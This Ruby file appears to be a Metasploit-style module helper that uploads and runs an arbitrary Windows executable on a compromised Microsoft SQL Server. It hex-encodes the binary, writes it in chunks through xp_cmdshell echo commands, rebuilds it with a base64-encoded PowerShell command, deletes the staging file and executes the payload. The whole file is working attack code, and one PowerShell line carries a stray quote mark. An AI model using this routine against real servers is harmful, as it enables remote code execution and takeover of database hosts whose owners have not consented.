# mssql.rb
# Upload an execute a Windows binary through MS SQL queries and PowerShell

def powershell_upload_exec(exe, debug=false)
    # hex converter
    hex = exe.unpack("H*")[0]

    #create random alpha 8 character names
    var_payload = rand_text_alpha(8)
    print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")

    # Our payload converter grabs a hex file and converts it to binary through PowerShell
    h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';
    $s = [string]::Join('',$s);
    $s = $s.Replace('`r','');
    $s = $s.Replace(''`n','');
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};
    [IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"

    h2b_unicode = Rex::Text.to_unicode(h2b)

    # base64 encoding allows us to perform execution through powershell without registry changes
    h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
    print_status("Uploading the payload #{var_payload}, please be patient...")

    idx = 0
    cnt = 500
    while(idx < hex.length -1)
        mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]} >> %TEMP%\\#{var_payload}", false)
        idx += cnt
    end

    print_status("Converting the payload utilizing PowerShell EncodedCommand...")
    mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
    mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
    print_status("Executing the payload...")
    mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
    print_status("Be sure to cleanup #{var_payload}.exe...")
end